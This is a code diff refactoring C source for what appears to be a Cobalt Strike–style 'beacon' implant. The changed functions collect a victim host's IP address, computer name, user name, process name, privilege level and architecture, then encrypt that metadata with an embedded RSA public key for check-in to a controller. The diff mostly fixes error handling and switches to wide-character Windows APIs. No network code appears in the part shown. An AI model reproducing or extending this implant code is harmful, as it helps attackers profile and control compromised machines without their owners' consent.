@@ -111,6 +111,7 @@ MakeMetaInfoResult MakeMetaInfo() {
     uint8_t ptrGetProcAdressFuncAddrBytes[4];
     PutUint32BigEndian(ptrGetProcAdressFuncAddrBytes, ptrGetProcAdressFuncAddr);
 
+    // 获取 IP
     uint32_t localIPInt = GetLocalIPInt();
     uint8_t localIPIntBytes[4];
     PutUint32BigEndian(localIPIntBytes, htonl(localIPInt));
@@ -181,7 +182,7 @@ MakeMetaInfoResult MakeMetaInfo() {
     
     size_t totalSize = 0;
 
-    for (size_t i = 0; i < sizeof(metaDataSizes) / sizeof(metaDataSizes[0]); ++i) {
+    for (size_t i = 0; i < metaDataCounts; ++i) {
         totalSize += metaDataSizes[i];
     }
 
@@ -191,7 +192,7 @@ MakeMetaInfoResult MakeMetaInfo() {
     uint8_t* metaInfo = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
     size_t metaInfoTotalSize = 0;
 
-    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
+    for (size_t i = 0; i < metaInfoCounts; ++i) {
         metaInfoTotalSize += metaInfoSizes[i];
     }
 
@@ -204,7 +205,7 @@ MakeMetaInfoResult MakeMetaInfo() {
     uint8_t* packetInfo = CalcByte(packetInfoArrays, packetInfoSizes, packetInfoCounts);
     size_t packetInfoTotalSize = 0;
 
-    for (size_t i = 0; i < sizeof(packetInfoSizes) / sizeof(packetInfoSizes[0]); ++i) {
+    for (size_t i = 0; i < packetInfoCounts; ++i) {
         packetInfoTotalSize += packetInfoSizes[i];
     }
 
@@ -221,96 +222,81 @@ MakeMetaInfoResult MakeMetaInfo() {
     return MakeMetaInfoResult;
 }
 
-ULONG PemToCNG(PCSTR pszPem, BCRYPT_KEY_HANDLE* phKey)
+BOOL PemToCNG(PCSTR pszPem, BCRYPT_KEY_HANDLE* phKey)
 {
     PBYTE pbDer = NULL;
     DWORD cbDer = 0;
-    DWORD err = 0;
     PCERT_PUBLIC_KEY_INFO pPubKeyInfo = NULL;
     DWORD cbPubKeyInfo = 0;
-    BOOL success;
+    BOOL result = FALSE;
 
-    success = CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, NULL, &cbDer, NULL, NULL);
-    if (!success) {
-        return GetLastError();
+    // 转 Base64 -> DER
+    if (!CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, NULL, &cbDer, NULL, NULL)) {
+        fprintf(stderr, "CryptStringToBinaryA(size) Failed With Error:%lu\n", GetLastError());
+        goto Cleanup;
     }
 
     pbDer = (PBYTE)malloc(cbDer);
     if (!pbDer) {
-        return ERROR_OUTOFMEMORY;
+        fprintf(stderr, "Memory allocation failed\n");
+        goto Cleanup;
     }
 
-    success = CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, pbDer, &cbDer, NULL, NULL);
-    if (!success) {
-        err = GetLastError();
+    if (!CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, pbDer, &cbDer, NULL, NULL)) {
+        fprintf(stderr, "CryptStringToBinaryA(data) Failed With Error:%lu\n", GetLastError());
+        goto Cleanup;
     }
 
-    if (err == 0) {
-        success = CryptDecodeObjectEx(
-            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
-            X509_PUBLIC_KEY_INFO,
-            pbDer, cbDer,
-            CRYPT_DECODE_ALLOC_FLAG,
-            NULL,
-            &pPubKeyInfo,
-            &cbPubKeyInfo
-        );
-
-        if (!success) {
-            err = GetLastError();
-        }
+    if (!CryptDecodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
+        X509_PUBLIC_KEY_INFO,
+        pbDer, cbDer,
+        CRYPT_DECODE_ALLOC_FLAG,
+        NULL,
+        &pPubKeyInfo,
+        &cbPubKeyInfo)) {
+        fprintf(stderr, "CryptDecodeObjectEx Failed With Error:%lu\n", GetLastError());
+        goto Cleanup;
     }
 
-    if (err == 0) {
-        success = CryptImportPublicKeyInfoEx2(
-            X509_ASN_ENCODING,
-            pPubKeyInfo,
-            0,
-            NULL,
-            phKey
-        );
-
-        if (!success) {
-            err = GetLastError();
-        }
+    if (!CryptImportPublicKeyInfoEx2(X509_ASN_ENCODING, pPubKeyInfo, 0, NULL, phKey)) {
+        fprintf(stderr, "CryptImportPublicKeyInfoEx2 Failed With Error:%lu\n", GetLastError());
+        goto Cleanup;
     }
 
-    if (pbDer) {
-        free(pbDer);
-    }
+    result = TRUE;
 
-    if (pPubKeyInfo) {
-        LocalFree(pPubKeyInfo);
-    }
+Cleanup:
+    if (pbDer) free(pbDer);
+    if (pPubKeyInfo) LocalFree(pPubKeyInfo);
 
-    return err;
+    return result;
 }
 
-
 // 使用 CNG 加密元数据
-EncryMetadataResult EncryMetadata()
+EncryptMetadataResult EncryMetadata()
 {
-    EncryMetadataResult result = { 0 };
+    EncryptMetadataResult result = { 0 };
     BCRYPT_KEY_HANDLE hKey = NULL;
+    uint8_t* pSrcData = NULL;
+    unsigned char* pEncrypted = NULL;
+    BOOL success = FALSE;
 
     // 获取并导入 PEM 公钥
-    if (PemToCNG(pub_key_str, &hKey) != 0 || !hKey) {
+    if (!PemToCNG(pub_key_str, &hKey) || !hKey) {
         fprintf(stderr, "Importing PEM public key failed\n");
-        return result;
+        goto cleanup;
     }
 
     // 获取原始元数据信息
     MakeMetaInfoResult meta = MakeMetaInfo();
-    uint8_t* pSrcData = meta.MakeMeta;
+    pSrcData = meta.MakeMeta;
     ULONG cbSrcData = (ULONG)meta.MakeMetaLen;
 
     if (!pSrcData || cbSrcData == 0) {
         fprintf(stderr, "MakeMetaInfo failed\n");
-        BCryptDestroyKey(hKey);
-        return result;
+        goto cleanup;
     }
 
-    // 获取公钥最大加密长度
     DWORD cbEncrypted = 0;
     NTSTATUS status = BCryptEncrypt(
         hKey,
@@ -322,19 +308,15 @@ EncryMetadataResult EncryMetadata()
         BCRYPT_PAD_PKCS1);
 
     if (!BCRYPT_SUCCESS(status)) {
-        fprintf(stderr, "Failed to estimate encryption length:%lu\n", GetLastError());
-        free(pSrcData);
-        BCryptDestroyKey(hKey);
-        return result;
+        fprintf(stderr, "Failed to estimate encryption length: 0x%08X\n", status);
+        goto cleanup;
     }
 
     // 分配加密缓冲区
-    unsigned char* pEncrypted = (unsigned char*)malloc(cbEncrypted);
+    pEncrypted = (unsigned char*)malloc(cbEncrypted);
     if (!pEncrypted) {
         fprintf(stderr, "Memory allocation failed\n");
-        free(pSrcData);
-        BCryptDestroyKey(hKey);
-        return result;
+        goto cleanup;
     }
 
     // 执行加密
@@ -347,20 +329,22 @@ EncryMetadataResult EncryMetadata()
         &cbEncrypted,
         BCRYPT_PAD_PKCS1);
 
-    free(pSrcData);
-
     if (!BCRYPT_SUCCESS(status)) {
-        fprintf(stderr, "BCryptEncrypt Failed With Error:%lu\n", GetLastError());
-        free(pEncrypted);
-        BCryptDestroyKey(hKey);
-        return result;
+        fprintf(stderr, "BCryptEncrypt failed: 0x%08X\n", status);
+        goto cleanup;
     }
 
-    result.EncryMetadata = pEncrypted;
-    result.EncryMetadataLen = cbEncrypted;
+    result.EncryptMetaData = pEncrypted;
+    result.EncryptMetaDataLen = cbEncrypted;
+    pEncrypted = NULL; 
+    success = TRUE;
 
-    BCryptDestroyKey(hKey);
-    return result;
+cleanup:
+    if (pSrcData) free(pSrcData);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (pEncrypted) free(pEncrypted); 
+
+    return result; 
 }
 
 // 判断 beacon 端 OS 架构
@@ -433,7 +417,7 @@ uint32_t GetMetaDataFlag() {
         flagInt += 4;
     }
 
-    BOOL isProcessX64 = IsProcessX64();
+    BOOL isProcessX64 = IsBeaconProcessX64();
     if (isProcessX64) {
         flagInt += 2;
     }
@@ -463,7 +447,7 @@ BOOL IsHighPriv() {
     return elevation.TokenIsElevated;
 }
 
-BOOL IsProcessX64() {
+BOOL IsBeaconProcessX64() {
 #if defined(_WIN64)
     return TRUE; // 编译为64位应用
 #else
@@ -521,89 +505,109 @@ uint32_t GetLocalIPInt() {
 
 unsigned char* GetComputerNameAsString() {
     DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
-    unsigned char* computerName = (unsigned char*)malloc(size);
-
-    if (!computerName) {
+    wchar_t* wComputerName = (wchar_t*)malloc(size * sizeof(wchar_t));
+    if (!wComputerName) {
         fprintf(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
-    if (!GetComputerNameW(computerName, &size)) {
+    if (!GetComputerNameW(wComputerName, &size)) {
         fprintf(stderr, "GetComputerNameW Failed With Error:%lu\n", GetLastError());
-        free(computerName);
+        free(wComputerName);
         return NULL;
     }
 
-    // 长度包含 \0
-    int mbLen = WideCharToMultiByte(CP_UTF8, 0, computerName, -1, NULL, 0, NULL, NULL);
+    // 长度包含 '\0'
+    int mbLen = WideCharToMultiByte(CP_UTF8, 0, wComputerName, -1, NULL, 0, NULL, NULL);
+    if (mbLen <= 0) {
+        fprintf(stderr, "WideCharToMultiByte(calc size) Failed With Error：%lu\n", GetLastError());
+        free(wComputerName);
+        return NULL;
+    }
+
     unsigned char* mbComputerName = (unsigned char*)malloc(mbLen);
     if (!mbComputerName) {
-        free(computerName);
-        fprintf(stderr, "Memory allocation Failed\n");
+        fprintf(stderr, "Memory allocation failed\n");
+        free(wComputerName);
         return NULL;
     }
 
-    // 包含 \0
-    WideCharToMultiByte(CP_UTF8, 0, computerName, -1, mbComputerName, mbLen, NULL, NULL);
-
+    WideCharToMultiByte(CP_UTF8, 0, wComputerName, -1, (char*)mbComputerName, mbLen, NULL, NULL);
+    free(wComputerName);
     return mbComputerName;
 }
 
-
 unsigned char* GetUsername() {
     DWORD size = UNLEN + 1;
-    unsigned char* userName = (unsigned char*)malloc(size);
-
-    if (!userName) {
-        fprintf(stderr, "Memory allocation Failed\n");
+    wchar_t* wUserName = (wchar_t*)malloc(size * sizeof(wchar_t));
+    if (!wUserName) {
+        fprintf(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
-    // 包含 \0
-    if (!GetUserNameA(userName, &size)) {
-        fprintf(stderr, "GetUserNameA Failed With Error:%lu\n", GetLastError());
-        free(userName);
+    if (!GetUserNameW(wUserName, &size)) {
+        fprintf(stderr, "GetUserNameW Failed With Error:%lu\n", GetLastError());
+        free(wUserName);
         return NULL;
     }
 
-    return userName;
+    // 转 UTF-8
+    int mbLen = WideCharToMultiByte(CP_UTF8, 0, wUserName, -1, NULL, 0, NULL, NULL);
+    if (mbLen <= 0) {
+        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
+        free(wUserName);
+        return NULL;
+    }
+
+    unsigned char* mbUserName = (unsigned char*)malloc(mbLen);
+    if (!mbUserName) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(wUserName);
+        return NULL;
+    }
+
+    WideCharToMultiByte(CP_UTF8, 0, wUserName, -1, (char*)mbUserName, mbLen, NULL, NULL);
+    free(wUserName);
+    return mbUserName;
 }
 
 unsigned char* GetProcessName() {
-    unsigned char* processName;
     DWORD size = MAX_PATH + 1;
-    processName = (unsigned char*)malloc(size + 1);
-
-    if (!processName) {
-        fprintf(stderr, "Memory allocation failed for processName\n");
+    wchar_t* wPath = (wchar_t*)malloc(size * sizeof(wchar_t));
+    if (!wPath) {
+        fprintf(stderr, "Memory allocation failed\n");
         return NULL;
     }
 
-    if (!GetModuleFileNameA(NULL, processName, size)) {
-        fprintf(stderr, "GetModuleFileNameA Failed With Error:%lu\n", GetLastError());
-        free(processName);
+    if (!GetModuleFileNameW(NULL, wPath, size)) {
+        fprintf(stderr, "GetModuleFileNameW Failed With Error:%lu\n", GetLastError());
+        free(wPath);
         return NULL;
     }
 
-    // 搜索 \ 之后的字符串
-    // 搜索 / 之后的字符串
-    unsigned char* baseName = (unsigned char*)strrchr(processName, '\\');
-    if (!baseName) baseName = (unsigned char*)strrchr(processName, '/');
-    if (baseName) baseName++;
-    else baseName = (unsigned char*)processName;
+    // 提取文件名
+    wchar_t* wBaseName = wcsrchr(wPath, L'\\');
+    if (wBaseName) wBaseName++;
+    else wBaseName = wPath;
 
-    size_t len = strlen((char*)baseName);
-    unsigned char* finalName = (unsigned char*)malloc(len + 1);
-    if (!finalName) {
-        fprintf(stderr, "Memory allocation failed for processName\n");
-        free(processName);
+    // 转 UTF-8
+    int mbLen = WideCharToMultiByte(CP_UTF8, 0, wBaseName, -1, NULL, 0, NULL, NULL);
+    if (mbLen <= 0) {
+        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
+        free(wPath);
         return NULL;
     }
 
-    memcpy(finalName, baseName, len);
-    finalName[len] = '\0';
-    free(processName);
-    return finalName;
+    unsigned char* mbName = (unsigned char*)malloc(mbLen);
+    if (!mbName) {
+        fprintf(stderr, "Memory allocation failed\n");
+        free(wPath);
+        return NULL;
+    }
+
+    WideCharToMultiByte(CP_UTF8, 0, wBaseName, -1, (char*)mbName, mbLen, NULL, NULL);
+    free(wPath);
+    return mbName;
 }
 
 unsigned char* GetCodePageANSI(size_t* bytesWritten) {
